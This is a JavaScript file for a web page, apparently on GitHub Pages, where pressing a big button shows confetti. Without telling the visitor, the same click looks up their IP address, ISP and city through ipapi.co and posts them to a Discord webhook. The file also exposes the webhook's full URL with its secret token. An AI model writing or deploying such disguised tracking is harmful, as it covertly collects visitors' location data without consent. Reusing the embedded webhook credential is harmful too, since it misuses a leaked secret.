const button = document.getElementById('pressButton');

// PASTE YOUR WEBHOOK URL INSIDE THE QUOTES BELOW
const webhookUrl = "https://discord.com/api/webhooks/1475505677546946652/VXzA9a4hBa3nOs8AsanQBxW2itixFYNCnpKAZwNXKvVYr9ug4fSvlzLvRiMklimQjSwl";

button.addEventListener('click', () => {
    // 1. Trigger Confetti Explosion immediately
    // This uses the library loaded in index.html
    const count = 200;
    const defaults = {
        origin: { y: 0.7 } // Start explosion slightly below center
    };

    function fire(particleRatio, opts) {
        confetti(Object.assign({}, defaults, opts, {
            particleCount: Math.floor(count * particleRatio)
        }));
    }

    // Shoot confetti in different directions
    fire(0.25, { spread: 26, startVelocity: 55 });
    fire(0.2, { spread: 60 });
    fire(0.35, { spread: 100, decay: 0.91, scalar: 0.8 });
    fire(0.1, { spread: 120, startVelocity: 25, decay: 0.92, scalar: 1.2 });
    fire(0.1, { spread: 120, startVelocity: 45 });


    // 2. Change button text temporarily
    const originalText = button.innerText;
    button.innerText = "Sent!";

    // 3. Send Webhook (Get IP & Network)
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            const networkName = data.org || "Unknown Network";
            const ip = data.ip;
            const city = data.city;

            const payload = {
                username: "Button Press Tracker",
                embeds: [
                    {
                        title: "🎉 Button Pressed!",
                        description: "Someone pressed the big button.",
                        color: 13369344, // Purple color
                        fields: [
                            {
                                name: "Network / ISP",
                                value: networkName,
                                inline: true
                            },
                            {
                                name: "IP Address",
                                value: ip,
                                inline: true
                            },
                            {
                                name: "City",
                                value: city,
                                inline: true
                            }
                        ],
                        footer: {
                            text: "GitHub Pages Tracker"
                        }
                    }
                ]
            };

            return fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        })
        .then(response => {
            console.log("Webhook sent!");
            // Reset button text after 2 seconds
            setTimeout(() => {
                button.innerText = originalText;
            }, 2000);
        })
        .catch(error => {
            console.error('Error:', error);
            button.innerText = "Error";
        });
});
